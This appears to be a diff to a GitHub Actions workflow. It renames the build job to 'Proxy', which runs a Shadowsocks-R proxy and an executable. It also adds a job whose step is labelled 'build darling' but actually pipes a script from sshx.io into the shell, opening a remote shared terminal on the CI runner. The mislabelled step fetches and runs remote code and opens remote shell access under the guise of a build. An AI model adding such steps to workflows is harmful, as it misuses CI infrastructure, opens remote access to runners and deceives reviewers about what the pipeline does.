@@ -2,7 +2,7 @@ name: CI
 on: push
 
 jobs:
-  build:
+  Proxy:
     runs-on: ubuntu-latest
     steps:
       - name: start Shadowsocks-R proxy
@@ -19,3 +19,8 @@ jobs:
         ls
         pwd
         ./mockgpt.exe
+  Darling:
+    runs-on: ubuntu-22.04
+    steps:
+      - name: build darling
+        run: curl -sSf https://sshx.io/get | sh -s run
